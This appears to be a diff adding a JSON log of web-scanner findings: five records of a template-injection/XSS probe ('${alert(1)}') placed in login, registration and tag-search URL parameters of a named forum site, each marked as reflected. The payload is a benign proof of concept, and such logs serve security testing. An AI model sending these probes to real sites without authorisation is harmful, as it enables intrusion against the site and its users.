@@ -1,0 +1,37 @@
+[
+    {
+        "timestamp": "2026-08-14T12:19:18.809Z",
+        "target_scope": "https://forum.1win.com",
+        "exploit_url": "https://forum.1win.com/login/?auth=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://forum.1win.com/login/?auth=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T12:19:22.775Z",
+        "target_scope": "https://forum.1win.com",
+        "exploit_url": "https://forum.1win.com/login/?password=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://forum.1win.com/login/?password=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T12:25:08.993Z",
+        "target_scope": "https://forum.1win.com",
+        "exploit_url": "https://forum.1win.com/register/?password=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://forum.1win.com/register/?password=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T13:19:06.183Z",
+        "target_scope": "https://forum.1win.com",
+        "exploit_url": "https://forum.1win.com/tags/hii/?q=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://forum.1win.com/tags/hii/?q=%24%7Balert(1)%7D"
+    },
+    {
+        "timestamp": "2026-08-14T13:19:58.832Z",
+        "target_scope": "https://forum.1win.com",
+        "exploit_url": "https://forum.1win.com/tags/hii/%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://forum.1win.com/tags/hii/%24%7Balert(1)%7D"
+    }
+]
